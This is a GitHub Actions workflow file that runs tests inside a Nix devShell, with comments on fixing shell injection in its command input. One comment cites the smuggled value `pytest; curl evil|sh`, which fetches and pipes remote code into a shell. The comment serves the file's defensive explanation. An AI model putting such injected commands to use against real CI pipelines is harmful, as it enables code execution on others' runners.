name: dynamic-tests-nix

on:
  workflow_call:
    inputs:
      test-command:
        description: "Command to run inside the Nix devShell"
        type: string
        default: "python3 -m pytest tests/ -v"
        required: false

jobs:
  test:
    runs-on: [self-hosted, macOS]
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - name: Add Nix to PATH
        run: echo "/nix/var/nix/profiles/default/bin" >> "$GITHUB_PATH"
      # The input reaches the shell through env: rather than being interpolated
      # into the script. GitHub expands ${{ }} by pasting text into the script
      # before bash sees it, so a caller passing `pytest; curl evil|sh` would
      # execute both halves; an env var is data the shell never re-parses as
      # syntax. (semgrep: run-shell-injection.)
      #
      # Handed to an explicit `bash -c`, NOT word-split.
      #
      # This was `nix develop -c $TEST_COMMAND` (unquoted) between 2026-08-13's
      # injection fix and this change, and it was wrong: unquoted expansion
      # splits on whitespace but does NOT re-interpret quotes, so a caller
      # passing `bash -c 'PYTHONPATH=. pytest tests/'` had the literal token
      # `'PYTHONPATH=.` handed to bash and the job died with exit 2. It worked
      # before only because ${{ }} pasted the text in and bash then parsed the
      # quotes as syntax -- which is exactly the property the injection fix
      # removed. agent-bridge broke on this; it went unnoticed because that repo
      # had not run CI in between.
      #
      # `bash -c "$TEST_COMMAND"` is still not injection: the value reaches an
      # interpreter as a single argument rather than being spliced into this
      # script, and "run this command line" is the documented contract of the
      # input. What the injection fix prevents is a value escaping into the
      # surrounding script; it was never meant to stop a command input being a
      # command.
      - name: Run tests in Nix devShell
        env:
          TEST_COMMAND: ${{ inputs.test-command }}
        run: nix develop -c bash -c "$TEST_COMMAND"
